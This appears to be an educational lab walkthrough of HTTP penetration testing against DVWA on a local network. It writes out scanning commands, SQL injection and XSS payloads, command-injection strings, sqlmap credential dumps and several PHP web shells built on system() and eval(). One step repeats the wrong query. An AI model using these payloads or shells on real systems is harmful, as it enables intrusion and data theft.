<h1 align="center"> HTTP Explotation </h1>





---

## **Purpose**: Educational lab – all testing performed in an authorized local environment  

## Scope
- **Attacker**: Kali Linux
- **Victim**: DVWA
- **Victm**: Metasplotable 2

---


## Table of Contents 




---


# INTRODUCTION TO HTTP

## HTTP Explaination:

### What is HTTP?
**HTTP (Hyper Text Transfer Protocol)** is basically a client-server protocol, wherein the client (web browser) makes a request to the server and in return, the server responds to the request. The server mostly responds with HTML formatted pages. By default, the HTTP protocol uses port 80, but the web server and the client can configure to use a different port.

HTTP is a stateless protocol which means that the server does not retain the information from each user. The World Wide Web (www) acts as the backbone, and its stateless nature simply means that it does not remember each and every client that connects to the internet. It does not matter if a single user sends multiple requests one after another; the server will still treat them all as independent requests.

We are currently using HTTP 2, its predecessors were HTTP 1.0 and 1.1, and the major differences between 1.X and 2, at a higher level, are:
- Http 2 is binary and not textual
- Http 2 is multiplexed, it can use a single connection for parallelism, Http one, on the other hand, is based on ordering and blocking.
- Http 2 uses compression in its headers to reduce the overhead.
- Http2 gives servers the capability to “push” responses to client servers proactively.


### How it Work




## HTTP method & Header 

### HTTP Method
| Method  | Purpose                                    |
| ------- | ------------------------------------------ |
| GET     | Retrieve data from a server                |
| POST    | Send data to create a new resource         |
| PUT     | Update an existing resource                |
| DELETE  | Remove a resource                          |
| HEAD    | Same as GET but without the response body  |
| OPTIONS | Discover allowed HTTP methods              |
| TRACE   | Debug request path                         |
| CONNECT | Establish a tunnel (e.g., HTTPS via proxy) |
| PATCH   | Partially update a resource                |


### Important HTTP Headers

| Header         | Purpose                                |
| -------------- | -------------------------------------- |
| Host           | Specifies the target website           |
| User-Agent     | Identifies browser/client              |
| Cookie         | Sends stored session data              |
| Authorization  | Sends credentials (e.g., Bearer token) |
| Content-Type   | Defines data format (JSON, HTML, etc.) |
| Content-Length | Size of request/response body          |
| Location       | Redirect target URL                    |
| Server         | Reveals web server software            |
| X-Powered-By   | Shows backend technology               |
| Set-Cookie     | Stores cookies on client               |
| Cache-Control  | Controls caching behavior              |


### Security HTTP Headers
| Header                    | Purpose                          |
| ------------------------- | -------------------------------- |
| X-Frame-Options           | Prevents clickjacking            |
| X-Content-Type-Options    | Stops MIME-type sniffing         |
| X-XSS-Protection          | Basic XSS protection             |
| Content-Security-Policy   | Controls allowed content sources |
| Strict-Transport-Security | Enforces HTTPS                   |
| Referrer-Policy           | Controls referrer information    |



### HTTP Status Codes – Informational (1xx)
| Code | Meaning             |
| ---- | ------------------- |
| 100  | Continue            |
| 101  | Switching Protocols |



### HTTP Status Codes – Success (2xx)
| Code | Meaning    |
| ---- | ---------- |
| 200  | OK         |
| 201  | Created    |
| 204  | No Content |


### HTTP Status Codes – Redirection (3xx)
| Code | Meaning           |
| ---- | ----------------- |
| 301  | Moved Permanently |
| 302  | Found             |
| 304  | Not Modified      |


### HTTP Status Codes – Client Errors (4xx)
| Code | Meaning            |
| ---- | ------------------ |
| 400  | Bad Request        |
| 401  | Unauthorized       |
| 403  | Forbidden          |
| 404  | Not Found          |
| 405  | Method Not Allowed |


### HTTP Status Codes – Server Errors (5xx)
| Code | Meaning               |
| ---- | --------------------- |
| 500  | Internal Server Error |
| 502  | Bad Gateway           |
| 503  | Service Unavailable   |







----





# HTTP (Port 80) Penetration Testing Methodology

## 1. Information Gatherings

### 1. Initial Target Assessment

#### Create working directory
````
mkdir HTTP
cd HTTP
````
<img width="324" height="184" alt="image" src="https://github.com/user-attachments/assets/6140e91b-0258-4f7f-a77f-98ba6ed89b17" />


#### Network Discoery
````
nmap -sS -sV -O -T4 192.168.100.97
````
<img width="1365" height="568" alt="image" src="https://github.com/user-attachments/assets/a968772c-66d7-48a6-b0a9-8b510d994f9e" />


#### Web service detection
````
nmap -p 80 --script "http*" 192.168.100.97
````
<img width="1216" height="806" alt="image" src="https://github.com/user-attachments/assets/4dfc95bc-0537-4f8d-9495-00a5f8028a53" />

<img width="1505" height="773" alt="image" src="https://github.com/user-attachments/assets/2d833c53-8216-4160-9100-e3cdcd96f667" />

<img width="714" height="713" alt="image" src="https://github.com/user-attachments/assets/029d0e8f-e0ec-47db-a807-79d083a7729c" />


#### Full port scan
````
nmap -p- --min-rate 1000 192.168.100.97
````

<img width="684" height="604" alt="image" src="https://github.com/user-attachments/assets/3021e0c6-a5ff-4df2-92d8-50603cb1a982" />

---

### 2. Web Application Fingerprinting

#### Banner grabbing
````
curl -I http://192.168.100.97:8080
````
<img width="588" height="282" alt="image" src="https://github.com/user-attachments/assets/ce625239-eec8-47ee-8454-9eec367f5562" />


````
curl -v http://192.168.100.97:8080 2>&1 | grep -i "server\|x-powered-by"
````
<img width="728" height="80" alt="image" src="https://github.com/user-attachments/assets/1d668d85-0b51-4b13-b5e7-1ef290ba9e5d" />


#### hatWeb comprehensive analysis
````
whatweb -a 3 http://192.168.100.97:8080 -v
````
<img width="1036" height="738" alt="image" src="https://github.com/user-attachments/assets/97018e99-f84f-495b-81fa-87fe08ff2cd7" />

<img width="1327" height="551" alt="image" src="https://github.com/user-attachments/assets/90b921af-0ecd-490b-81d3-562e0c500233" />

<img width="581" height="730" alt="image" src="https://github.com/user-attachments/assets/6d9318cd-a2bd-49e6-8871-6e4d35b5f9b2" />

- `-a 3`:
Sets the aggression level (how hard it tries to detect technologies).
 - `-a 1`: Stealthy (basic HTTP headers only)
 - `-a 2`: Normal (default)
 - `-a 3`: Aggressive — sends additional requests, checks more patterns, parses HTML/JS deeply
 - `-a 4`: Heavy — includes plugin checks, more payloads (can be noisy)
-  `-v`
  - Stands for verbose.
  - Shows detailed output, including: 
    - HTTP status code
    - Redirects
    - Detected plugins/technologies with confidence levels
    - Raw headers (sometimes).


#### Check for target specific files
````
curl -s http://192.168.100.97:8080 | grep -i "damn vulnerable"
curl -s http://192.168.100.97:8080/login.php | grep -i "dvwa"
````
<img width="877" height="183" alt="image" src="https://github.com/user-attachments/assets/183fe106-c5ec-44f0-8da4-f9b88d18eab3" />

- `curl -s`: Silently fetches the HTML content of the DVWA login page (no progress bar).
- `grep -i "damn vulnerable"`: Searches (case-insensitive) for the phrase "damn vulnerable" in that HTML.



````
curl -s http://192.168.100.97:8080/phpinfo.php | head -20
````
<img width="1314" height="792" alt="image" src="https://github.com/user-attachments/assets/bf96b138-ed69-40c3-a867-9fa6d56eaf30" />

- `curl -s`: Silently fetches the content of the URL (no progress/status output).
- `| head -20`: Shows only the first 20 lines of the response.

--


### 3. Technology Stack Analysis

#### **Server information**:
````
curl -I http://192.168.100.97:8080 | grep -i "server\|x-powered-by"
````
<img width="822" height="142" alt="image" src="https://github.com/user-attachments/assets/7f19a4e6-cea0-4512-a708-d20b7b1638ff" />

- `curl -I`: Fetches only the HTTP headers (not the page content).
- `grep -i "server\|x-powered-by"`: Filters (case-insensitive) for two key headers:
   - `Server`: Reveals the web server software and version (e.g., Apache, nginx).
   - `X-Powered-By`: Reveals the backend technology (e.g., PHP, ASP.NET).
**Note**: The `\|` means `OR` in grep (match "server" or "x-powered-by").


#### **WAF detection**:
````
nmap -p 80 --script http-waf-detect 192.168.100.97
````
<img width="649" height="222" alt="image" src="https://github.com/user-attachments/assets/f21f1fb0-1293-4f97-83a8-34565939111d" />

- `--script http-waf-detect`: Runs the Nmap NSE script called `http-waf-detect` , which tries to detect if a Web Application Firewall (WAF) is protecting the web server.
- A `WAF` is a security filter that blocks malicious requests (e.g., SQLi, XSS).
- How It Works:
The script sends suspicious-looking HTTP requests (e.g., with SQLi or XSS payloads) and analyzes responses:
    - If the response changes significantly (e.g., 403/406 error, custom block page), it suggests a WAF is active.
    - It compares behavior to known WAF fingerprints (Cloudflare, ModSecurity, etc.).

#### Combine with other NSE scripts:
````
nmap -p 80 --script http-waf-detect,http-server-header,http-title 192.168.100.97
````
<img width="862" height="222" alt="image" src="https://github.com/user-attachments/assets/b4d035ea-baae-4aae-8f4f-2467b0394a2c" />

#### Security headers
````
curl -s -I http://192.168.100.97:8080 | grep -i "security\|x-frame-options\|x-content-type-options\|x-xss-protection"
````
<img width="1241" height="81" alt="image" src="https://github.com/user-attachments/assets/56014b1c-6e3b-4ac3-b742-0ebe57fcff1f" />

- What This Does:
  - `curl -s -I`:
    - `-s` = silent (no progress bar)
    - `-I` = fetch only HTTP headers (no HTML body)
  - `grep -i "..."`:
Searches (case-insensitive) for key security-related HTTP headers:
     - `security`: may appear in cookies or custom headers (e.g., DVWA’s security level)
     - `X-Frame-Options`: prevents clickjacking
     - `X-Content-Type-Options`: stops MIME-type sniffing (reduces XSS risk)
     - `X-XSS-Protection`: enables browser XSS filter (legacy).


#### HTTP methods testing
````
curl -X OPTIONS http://192.168.100.97:8080 -I
````
<img width="602" height="297" alt="image" src="https://github.com/user-attachments/assets/56a657fa-0919-4652-ae93-2367ac95e359" />

````
nmap -p 80 --script http-methods 192.168.100.97
````
<img width="663" height="220" alt="image" src="https://github.com/user-attachments/assets/3e67a459-6077-403e-bf48-7fd76d1bba6c" />

---

### 4. Use metasploit for recon
#### HTTP version detection
````
msfconsole -q
search http_version 
use auxiliary/scanner/http/http_version
show options
````
<img width="1579" height="648" alt="image" src="https://github.com/user-attachments/assets/c517be9a-0d90-4174-9308-a6edf33efc1c" />

````
set RHOSTS 192.168.100.97
show options
````
<img width="1587" height="379" alt="image" src="https://github.com/user-attachments/assets/9d4b8e00-0752-441d-8a90-43098ff6fb60" />

````
run
````
<img width="506" height="119" alt="image" src="https://github.com/user-attachments/assets/9aa1e488-9475-4db3-a57f-b73df312ba20" />


#### Directory scanning
````
msfconsole -q
search dir_scanner
use auxiliary/scanner/http/dir_scanner
show options
````
<img width="1891" height="705" alt="image" src="https://github.com/user-attachments/assets/0d636a94-f9e3-4308-b146-a2969c5e0f89" />

````
set RHOSTS 192.168.100.97
show options
````
<img width="1889" height="438" alt="image" src="https://github.com/user-attachments/assets/ec2fa633-0f6a-47dd-a026-1a364760a8a2" />

````
set THREADS 20
run
````
<img width="596" height="199" alt="image" src="https://github.com/user-attachments/assets/f89c400f-ac19-4ffc-9390-ac667ba2aaeb" />

- **More command that we can use**:

#### HTTP header detection
````
use auxiliary/scanner/http/http_header
set RHOSTS 192.168.100.97
run
````


#### PHP version detection
````
use auxiliary/scanner/http/php_version
set RHOSTS 192.168.100.97
run
````
---




## 2. Enumeration

### 1. Application Enumeration

#### Check main pages
````
curl -s -o /dev/null -w "%{http_code}" http://192.168.100.97:8080/index.php
curl -s -o /dev/null -w "%{http_code}" http://192.168.100.97:8080/login.php
curl -s -o /dev/null -w "%{http_code}" http://192.168.100.97:8080/setup.php
curl -s -o /dev/null -w "%{http_code}" http://192.168.100.97:8080/security.php
````
<img width="1048" height="382" alt="image" src="https://github.com/user-attachments/assets/82a8a16d-6fda-45a9-8b82-4c7f749a67c4" />


#### Check vulnerability modules
````
curl -s -o /dev/null -w "%{http_code}" http://192.168.100.97:8080/vulnerabilities/brute/
curl -s -o /dev/null -w "%{http_code}" http://192.168.100.97:8080/vulnerabilities/exec/
curl -s -o /dev/null -w "%{http_code}" http://192.168.100.97:8080/vulnerabilities/sqli/
curl -s -o /dev/null -w "%{http_code}" http://192.168.100.97:8080/vulnerabilities/upload/
````
<img width="1130" height="376" alt="image" src="https://github.com/user-attachments/assets/4ad58cd2-f123-4149-80c2-b1a3612ee269" />


#### Check for backup files
````
curl -s http://192.168.100.97:8080/config.php.bak
curl -s http://192.168.100.97:8080/config.inc.php.old
curl -s http://192.168.100.97:8080/.env
````
<img width="826" height="761" alt="image" src="https://github.com/user-attachments/assets/fe696000-7371-45f0-9564-875546d1fb22" />


### 2. Directory & File Bruteforcing
#### Gobuster for directories
````
gobuster dir -u http://192.168.100.97:8080/ -w /usr/share/wordlists/dirb/common.txt -o gobuster_directories.txt -t 50
````
<img width="1728" height="807" alt="image" src="https://github.com/user-attachments/assets/24935f55-29e5-4f50-9cbf-bed94b2ee12b" />

````
cat gobuster_directories.txt
````
<img width="924" height="313" alt="image" src="https://github.com/user-attachments/assets/b9f5af4b-0d3b-4420-81cf-453fd15293be" />


#### Gobuster for PHP files
````
gobuster dir -u http://192.168.100.97:8080/ -w /usr/share/wordlists/dirb/common.txt -x php -t 50
````
<img width="821" height="712" alt="image" src="https://github.com/user-attachments/assets/34b0485a-5b34-4565-93df-fb7cb2b52833" />


#### Dirsearch comprehensive scan
````
dirsearch -u http://192.168.100.97:8080/ -e php,html,htm,js,txt,json,xml,conf,config,bak,backup,old -t 50
````
<img width="1250" height="773" alt="image" src="https://github.com/user-attachments/assets/10350d6f-5d90-4a04-ab58-29bb59822f13" />


### 3. Authentication Enumeration
####  Analyze login form
````
curl -s http://192.168.100.97:8080/login.php | grep -E "form|input|type=.password.|type=.text.|name=.username.|name=.password."
````
<img width="1399" height="187" alt="image" src="https://github.com/user-attachments/assets/b8b5cdd1-822f-44dd-8552-2293a6be1018" />



#### Session analysis
````
curl -s -c dvwa_cookies.txt http://192.168.100.97:8080/login.php
cat dvwa_cookies.txt
````
<img width="1242" height="777" alt="image" src="https://github.com/user-attachments/assets/c0db575f-f765-4d1c-a290-735e38a4e7af" />

<img width="741" height="147" alt="image" src="https://github.com/user-attachments/assets/57b87c23-e745-43ba-b99c-67ab4a6c022a" />

---






## 3. VULNERABILITY ASSESSMENT

### 1. Automated Vulnerability Scanning

#### Nikto 
````
nikto -h http://192.168.100.97:8080
````
<img width="1217" height="465" alt="image" src="https://github.com/user-attachments/assets/22ec89ae-b675-4326-9f4c-3e0782691037" />

#### Nmap vulnerability scripts
````
nmap -p 8080 --script "http-vuln*" 192.168.100.97
````
<img width="517" height="175" alt="image" src="https://github.com/user-attachments/assets/bb963314-4a40-4e1c-87cb-498448943609" />


#### Nmap all HTTP scripts
````
nmap -p 8080 --script "http-*" 192.168.100.97
````
<img width="684" height="604" alt="image" src="https://github.com/user-attachments/assets/3021e0c6-a5ff-4df2-92d8-50603cb1a982" />

<img width="1505" height="773" alt="image" src="https://github.com/user-attachments/assets/790cd051-64bb-4828-9b4f-ec47fc2b3c5d" />

<img width="714" height="713" alt="image" src="https://github.com/user-attachments/assets/d6d33eb1-c212-4975-a138-8f5f026482c9" />



### 2. Manual SQL Injection 

#### SQL Injection
- We can use command or inject in website:
````
curl -s -b dvwa_cookies.txt "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1&Submit=Submit"
````
<img width="836" height="105" alt="image" src="https://github.com/user-attachments/assets/0b96bfd2-e6a7-4adc-b992-a28b305d7b71" />

- And go to website we will see:
<img width="814" height="791" alt="image" src="https://github.com/user-attachments/assets/088fdf23-8a13-45b8-b530-248cc7881dc9" />


- Or we can injection on website: http://192.168.100.97:8080/vulnerabilities/sqli/?id=1'&Submit=Submit
<img width="942" height="626" alt="image" src="https://github.com/user-attachments/assets/2c235786-8ea5-4e99-8018-30b0b6e61bb9" />

- In Injection we need to try all inject in our target URL

- **URL**: http://192.168.100.97:8080/vulnerabilities/sqli/?id=1' UNION SELECT 1,2-- &Submit=Submit
<img width="968" height="635" alt="image" src="https://github.com/user-attachments/assets/fc871e2f-974f-4553-adb4-302fe7f41e03" />

- **URL**: http://192.168.100.97:8080/vulnerabilities/sqli/?id=1' AND 1=1-- &Submit=Submit
<img width="1011" height="798" alt="image" src="https://github.com/user-attachments/assets/1240126a-0990-49eb-a0ea-16d6b143d01b" />

- **URL**: http://192.168.100.97:8080/vulnerabilities/sqli/?id=1' AND 1=2-- &Submit=Submit
<img width="1007" height="696" alt="image" src="https://github.com/user-attachments/assets/4ccb0455-a010-40de-a8d3-c1c7c8a13c36" />

In this no injection>


#### blind SQL injection
- **URL**: http://192.168.100.97:8080/vulnerabilities/sqli_blind/?id=1' AND '1'='1&Submit=Submit
<img width="973" height="696" alt="image" src="https://github.com/user-attachments/assets/de85b18b-89b7-4b02-9e31-780edfb139f1" />

- URL: http://192.168.100.97:8080/vulnerabilities/sqli_blind/?id=1' AND '1'='2&Submit=Submit
<img width="973" height="691" alt="image" src="https://github.com/user-attachments/assets/d0a0acb2-72e3-4008-8a64-108ae41d9c9c" />

**Note**: 
  - `exists`: ID is valid.
  - `MISSING`: ID is invalid.

--



### 3. Manual XSS Testing

#### Reflected XSS 
Go to this URL and we can input 
- URL: http://192.168.100.97:8080/vulnerabilities/xss_r/?name=
- In this we can use command or use direct to XSS.
- **XSS**: `<script>alert('XSS')</script>`
<img width="986" height="798" alt="image" src="https://github.com/user-attachments/assets/9bd53bb4-9366-4aff-8855-655e97398ffc" />

- And then when we click `Submit` we will see:
<img width="422" height="138" alt="image" src="https://github.com/user-attachments/assets/99ccd915-1dd0-4d4f-961b-d54befedeaa1" />

<img width="978" height="525" alt="image" src="https://github.com/user-attachments/assets/7f321e2d-7276-4fb0-a4f3-d235fa50558c" />


- **XSS**: `<script>alert('XSS')</script>`
<img width="787" height="354" alt="image" src="https://github.com/user-attachments/assets/3cb0fd54-4ed3-45bb-ada4-4db544280395" />

<img width="792" height="463" alt="image" src="https://github.com/user-attachments/assets/95320646-7b73-4f41-9411-a6ea1b28cf77" />

<img width="780" height="336" alt="image" src="https://github.com/user-attachments/assets/baa39f7a-7101-47b9-843d-394af9b66f58" />


- **XSS**: `<svg onload=alert('XSS')>`
<img width="772" height="367" alt="image" src="https://github.com/user-attachments/assets/28d7e2b3-c0af-4c8e-937f-ec097c82ac3d" />

<img width="423" height="138" alt="image" src="https://github.com/user-attachments/assets/b3559d58-7c57-4a83-8a09-27c4c70308cb" />

<img width="737" height="468" alt="image" src="https://github.com/user-attachments/assets/860168cd-b11f-457c-95f4-37c3fb317419" />

--



#### Stored XSS 
- **URL**: http://192.168.100.97:8080/vulnerabilities/xss_s/
- **XSS**: `mtxMessage=<script>alert('XSS')</script>&txtName=test&btnSign=Sign+Guestbook`
<img width="961" height="528" alt="image" src="https://github.com/user-attachments/assets/998b77be-83fb-48b5-8e7b-e7a54de92da6" />

<img width="732" height="397" alt="image" src="https://github.com/user-attachments/assets/4049c322-5513-4ae2-bddf-f2e1c23c93c7" />

<img width="763" height="430" alt="image" src="https://github.com/user-attachments/assets/96e3c641-6333-4f47-9218-18ce3a8e23df" />

--



### 4. File Upload Testing

#### Create test web shell
````
mousepad test_shell.php
````
<img width="278" height="69" alt="image" src="https://github.com/user-attachments/assets/1630c469-8559-482f-923a-a078984d0891" />

````
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
````
<img width="475" height="219" alt="image" src="https://github.com/user-attachments/assets/a9501e81-9a84-4d22-9dd7-9e4093d36591" />


````
chmod +x test_shell.php
````
<img width="241" height="51" alt="image" src="https://github.com/user-attachments/assets/24efa430-7050-47f9-87a0-c707d1027f2c" />


#### Upload web shell
- **URL**: http://192.168.100.97:8080/vulnerabilities/upload/
<img width="976" height="522" alt="image" src="https://github.com/user-attachments/assets/01d9bf3d-e5ec-4ca5-9e60-a48f8508944c" />

<img width="1026" height="836" alt="image" src="https://github.com/user-attachments/assets/31b0fb47-7972-4788-a1b9-64083a95e9bd" />

<img width="722" height="313" alt="image" src="https://github.com/user-attachments/assets/e5ad5d4b-fe39-4e7f-8fea-e89d04239018" />

<img width="725" height="328" alt="image" src="https://github.com/user-attachments/assets/54cf97d9-ca6e-46ba-a0dc-eb387d86eeec" />

- So in this we got successful to upload shell.



#### command execution on uploaded shell
````
curl -s "http://192.168.100.97:8080/hackable/uploads/test_shell.php?cmd=id"
curl -s "http://192.168.100.97:8080/hackable/uploads/test_shell.php?cmd=whoami"
curl -s "http://192.168.100.97:8080/hackable/uploads/test_shell.php?cmd=uname -a"
````
<img width="1049" height="383" alt="image" src="https://github.com/user-attachments/assets/185f8edd-5e76-4270-949c-57561adc35d0" />

- Or we can use direct in browser:
- URL:
  - http://192.168.100.97:8080/hackable/uploads/test_shell.php?cmd=id
  - http://192.168.100.97:8080/hackable/uploads/test_shell.php?cmd=whoami
  - http://192.168.100.97:8080/hackable/uploads/test_shell.php?cmd=uname -a
 
<img width="970" height="192" alt="image" src="https://github.com/user-attachments/assets/0dac27f9-6a67-4b70-b5e2-da08665b9d2e" />

<img width="946" height="180" alt="image" src="https://github.com/user-attachments/assets/6489db2d-98bc-46a6-be26-d7e7b5670111" />

<img width="1040" height="280" alt="image" src="https://github.com/user-attachments/assets/f88a0bcb-bbab-4590-b5d3-84ae5cc334a0" />

--



### 5. Command Injection

#### Command injection payload
- Go to this **URL**: http://192.168.100.97:8080/vulnerabilities/exec/

- **URL*: `ip=127.0.0.1; whoami&Submit=Submit`
<img width="1176" height="798" alt="image" src="https://github.com/user-attachments/assets/3230b923-c6c0-4665-98eb-529714d1cf91" />

<img width="870" height="396" alt="image" src="https://github.com/user-attachments/assets/83d04b0e-e727-4213-88be-913ef704308a" />


- **URL**: `ip=127.0.0.1 | id&Submit=Submit`
<img width="1178" height="796" alt="image" src="https://github.com/user-attachments/assets/8b13d5f0-8630-4413-8b93-83e749333969" />

<img width="854" height="390" alt="image" src="https://github.com/user-attachments/assets/5bcd42f6-9e87-409c-8147-cdf311032ad0" />

- Some `Command Injection` we can use:
  - **CI**: ``ip=127.0.0.1 && pwd&Submit=Submit``
  - **CI**: ``ip=127.0.0.1 \`id\`&Submit=Submit``
  - **CI**: ``ip=127.0.0.1 \$(uname -a)&Submit=Submit``


---




## 4. EXPLOITATION

### 1. SQL Injection with SQLMap

#### Get cookie for SQLMAP
````
cat dvwa_cookies.txt | grep -v '#' | awk '{print $6"="$7}' | tr '\n' ';'
````
<img width="1020" height="121" alt="image" src="https://github.com/user-attachments/assets/88fb50dc-ff93-4d0e-b11c-e603be17158d" />

- `grep -v '#'`: Remove command lines.
- `awk'{print $6"="$7}'`:  grabs cookie name and value
- `fr'\n'';'`: joins them into one line with semicolons.

- Or we can use `Inspect` or `Q`: 
<img width="1003" height="794" alt="image" src="https://github.com/user-attachments/assets/84a3f2ae-745c-44c2-9a23-49236e012d47" />

<img width="1920" height="521" alt="image" src="https://github.com/user-attachments/assets/163c5078-384e-4b6d-97e4-55126b6c170e" />

- In this we see the sorrect cookie

#### Database enumeration
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=8lg0gvjkk3295jsftu0e8nl0j6" --batch --dbs
````
<img width="1862" height="777" alt="image" src="https://github.com/user-attachments/assets/7f68dd92-ed70-4ca8-8cb2-7e99bdee0ed1" />

<img width="1053" height="270" alt="image" src="https://github.com/user-attachments/assets/b0b42e8e-0541-4f44-85da-f2a43a459208" />

- So in this found `available database [2]`


#### Table enumeration
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=8lg0gvjkk3295jsftu0e8nl0j6" --batch -D dvwa --tables
````
<img width="1901" height="702" alt="image" src="https://github.com/user-attachments/assets/cabafcf0-eb34-471d-bcb3-c73eccba887b" />

<img width="1176" height="336" alt="image" src="https://github.com/user-attachments/assets/24c9a4a0-f51a-49c9-aa45-b0471579f32a" />


#### Column enumeration  
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=8lg0gvjkk3295jsftu0e8nl0j6" --batch -D dvwa -T users --columns
````
<img width="1905" height="724" alt="image" src="https://github.com/user-attachments/assets/bb3191d0-7237-4f07-b718-1cafffb2f264" />

<img width="1177" height="523" alt="image" src="https://github.com/user-attachments/assets/5f93b3df-3e29-4608-aede-b0a072cc29b5" />

#### Data extraction
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=8lg0gvjkk3295jsftu0e8nl0j6" --batch -D dvwa -T users --dump
````
<img width="1897" height="725" alt="image" src="https://github.com/user-attachments/assets/ae38642d-e55d-4135-926e-9a7abff5fff5" />

<img width="1608" height="678" alt="image" src="https://github.com/user-attachments/assets/d01b16b9-d072-4aff-b5f7-5f443d280d97" />

- In this we found the `Username` and `Passwords` and we can login with these credentials.


#### File system access
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123" --batch --file-read="/etc/passwd"
````
<img width="1906" height="715" alt="image" src="https://github.com/user-attachments/assets/c558038a-e2be-4d54-8a3a-85486f96d6b6" />

<img width="1172" height="275" alt="image" src="https://github.com/user-attachments/assets/5debaf76-d178-40c9-8ba7-342b50a916a7" />

- Why did it not work cause:
    - The MySQL database user used by DVWA does not have the `FILE` privilege, which is required to read files from the server’s filesystem using `LOAD_FILE()` — the mechanism sqlmap relies on for `--file-read`. 

---


### 2. Manual SQL Injection Exploitation

#### Extract database version
- **Go to SQL INJECTION or URL**: http://192.168.100.97:8080/vulnerabilities/sqli/
- **Direct Link**: http://192.168.100.97:8080/vulnerabilities/sqli/?id=1' UNION SELECT 1,@@version-- &Submit=Submit
- **SQL**: `1' UNION SELECT 1,@@version-- &Submit=Submit`
<img width="672" height="295" alt="image" src="https://github.com/user-attachments/assets/41c5fae0-9956-4289-874a-b4dc49817a4e" />

<img width="635" height="387" alt="image" src="https://github.com/user-attachments/assets/8325c4bb-9a1a-4446-851b-b66723f5888b" />


#### Extract current user
- **Direct Limk**: http://192.168.100.97:8080/vulnerabilities/sqli/?id=1' UNION SELECT 1,user()-- &Submit=Submit
- **SQL**: `1' UNION SELECT 1,user()-- &Submit=Submit`
<img width="674" height="301" alt="image" src="https://github.com/user-attachments/assets/371dde72-cf48-46a4-aa86-aeebd376d5a0" />

<img width="666" height="396" alt="image" src="https://github.com/user-attachments/assets/84ebcd26-0ca4-4bb2-b43c-65b0b18c493a" />


#### Extract database name
- **Direct Link**: http://192.168.100.97:8080/vulnerabilities/sqli/?id=1' UNION SELECT 1,database()-- &Submit=Submit
- **SQL**: `1' UNION SELECT 1,database()-- &Submit=Submit`
<img width="665" height="263" alt="image" src="https://github.com/user-attachments/assets/2e963ad2-bf04-4f5d-9601-c2ed5816d4b4" />

<img width="667" height="397" alt="image" src="https://github.com/user-attachments/assets/ed1fc079-0849-4aac-8062-1faa1be2e12e" />


#### Extract table names
- GO to direct link: http://192.168.100.97:8080/vulnerabilities/sqli/?id=1' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database()-- &Submit=Submit
- **SQL**: `1' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database()-- &Submit=Submit`
<img width="665" height="280" alt="image" src="https://github.com/user-attachments/assets/0eecca52-f6cd-4b32-ac03-46c43d569840" />

<img width="900" height="451" alt="image" src="https://github.com/user-attachments/assets/93bac5e6-12fd-44cc-832d-9fc30bec646d" />

 
#### Extract column names
- **Direct Link**: http://192.168.100.97:8080/vulnerabilities/sqli/?id=1' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database()-- &Submit=Submit
- **SQL**: `1' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database()-- &Submit=Submit`
<img width="666" height="308" alt="image" src="https://github.com/user-attachments/assets/36bbca19-21f7-4ffc-a542-56d728bbcbcf" />

<img width="916" height="471" alt="image" src="https://github.com/user-attachments/assets/8adb2b67-f9a4-4b1e-af4b-1f0f5ca839cc" />


#### Extract user credentials
- **Dircet Link**: http://192.168.100.97:8080/vulnerabilities/sqli/?id=1' UNION SELECT 1,concat(user,':',password) FROM users-- &Submit=Submit
- **SQL**: `1' UNION SELECT 1,concat(user,':',password) FROM users-- &Submit=Submit`
<img width="669" height="278" alt="image" src="https://github.com/user-attachments/assets/7b9878f4-f124-41c0-89f0-be1d31ec4de6" />

<img width="673" height="622" alt="image" src="https://github.com/user-attachments/assets/4f89f898-860b-4400-ad9b-7afabbb9b07e" />

---



### 3. File Upload Exploitation

#### Create web shell:
````
mousepad shell.php
````
````
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd'] . " 2>&1");
    echo "</pre>";
    die;
}

if(isset($_POST['code'])){
    eval($_POST['code']);
    die;
}

if(isset($_FILES['upload'])){
    move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name']);
    echo "File uploaded: " . $_FILES['upload']['name'];
    die;
}
?>
<form method="post" enctype="multipart/form-data">
<input type="file" name="upload">
<input type="submit" value="Upload">
</form>
````
<img width="326" height="193" alt="image" src="https://github.com/user-attachments/assets/2c566509-556c-4524-a4a3-fe740fa74019" />

<img width="742" height="768" alt="image" src="https://github.com/user-attachments/assets/2e9e1896-5f28-45f4-87d7-907be08870ec" />

- In this we got `shell.php`.

#### Upload shell
- Go to `File Upload` or go to direct link: http://192.168.100.97:8080/vulnerabilities/upload/
<img width="892" height="490" alt="image" src="https://github.com/user-attachments/assets/0bba3156-a035-4449-ac8b-75f835708c7f" />

<img width="1147" height="752" alt="image" src="https://github.com/user-attachments/assets/3ee6d809-cde9-4591-8ed8-3310809c4563" />

<img width="681" height="290" alt="image" src="https://github.com/user-attachments/assets/7935dc0d-975c-4bb9-a281-4d31e650a6eb" />

<img width="673" height="361" alt="image" src="https://github.com/user-attachments/assets/0bafeecd-ea21-4bdb-b0a6-012b9f9b263c" />

- Check `File Upload`: http://192.168.100.97:8080/hackable/uploads/shell.php
<img width="814" height="194" alt="image" src="https://github.com/user-attachments/assets/5a16883a-e68d-450a-ba0d-2f110331757c" />

- Other `shell`:
````
mousepad shell1.php
````
````
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = $_REQUEST['cmd'];
    system($cmd);
    echo "</pre>";
}
?>
````
````
chmod +x shell1.php
````
<img width="296" height="188" alt="image" src="https://github.com/user-attachments/assets/5d1e003a-0c27-4d69-b400-bc3c66bfbdcc" />

- Upload it:
